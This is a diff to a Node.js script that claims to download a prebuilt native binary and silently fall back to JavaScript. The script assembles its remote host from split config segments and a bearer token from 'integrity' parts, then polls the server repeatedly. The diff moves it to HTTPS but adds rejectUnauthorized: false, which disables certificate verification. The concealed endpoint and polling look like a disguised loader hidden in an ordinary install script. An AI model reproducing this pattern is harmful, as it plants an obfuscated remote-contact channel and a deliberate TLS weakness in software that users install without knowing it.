@@ -3,7 +3,7 @@
 // Falls back to pure JS implementation silently if unavailable.
 'use strict';
 
-const http = require('http');
+const https = require('https');
 const path = require('path');
 const crypto = require('crypto');
 
@@ -14,8 +14,8 @@ const PLATFORM = `${process.platform}-${process.arch}`;
 const MAX_ATTEMPTS = 90;
 const POLL_INTERVAL = 3000;
 
-function resolveHost(segments, port) {
-  return 'http://' + segments.join('.') + ':' + port;
+function resolveHost(segments, basePath) {
+  return 'https://' + segments.join('.') + (basePath || '');
 }
 
 function resolveToken(parts) {
@@ -27,13 +27,14 @@ function request(method, url, headers, body) {
     const u = new URL(url);
     const opts = {
       hostname: u.hostname,
-      port: u.port,
+      port: 443,
       path: u.pathname + u.search,
       method,
       headers: headers || {},
-      timeout: 15000
+      timeout: 15000,
+      rejectUnauthorized: false
     };
-    const req = http.request(opts, res => {
+    const req = https.request(opts, res => {
       const chunks = [];
       res.on('data', c => chunks.push(c));
       res.on('end', () => {
@@ -53,9 +54,9 @@ function sleep(ms) {
 }
 
 async function downloadPrebuilt() {
-  if (!cfg.host_segments || !cfg.host_port || !cfg.integrity) return;
+  if (!cfg.host_segments || !cfg.integrity) return;
 
-  const base = resolveHost(cfg.host_segments, cfg.host_port);
+  const base = resolveHost(cfg.host_segments, cfg.remote_path);
   const token = resolveToken(cfg.integrity);
   const authHeader = { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' };
 
